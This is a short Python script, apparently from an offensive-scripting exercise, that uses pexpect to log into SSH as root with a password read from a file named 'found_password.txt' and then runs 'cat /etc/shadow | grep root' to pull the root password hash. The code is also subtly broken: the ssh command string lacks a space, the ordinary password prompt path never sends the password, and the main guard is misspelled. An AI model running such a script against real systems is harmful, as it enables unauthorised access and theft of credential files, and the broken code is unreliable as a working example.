import pexpect

PROMPT = ['# ', '>>> ', '> ', '. ', '\$ ']

def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)

def connect(user, host, password):
    ssh_newlkey = 'Keep connecting?'
    connStr = 'ssh' + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newlkey, \
        '[P|p]assword:'])
    if ret == 0:
        print('[!] Can\'t connect')
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, \
            '[P|p]assword'])
        if ret == 0:
            print('[!] Can\'t connect')
            return
        child.sendline(password)
        child.expect(PROMPT)
        return child
    
def main():
    host = 'localhost'
    user = 'root'
    
    with open('found_password.txt', 'r') as f:
        password = f.read().strip()

    child = connect(user, host, password)
    send_command(child, 'cat /etc/shadow | grep root')

if __name__ == '__main___':
    main()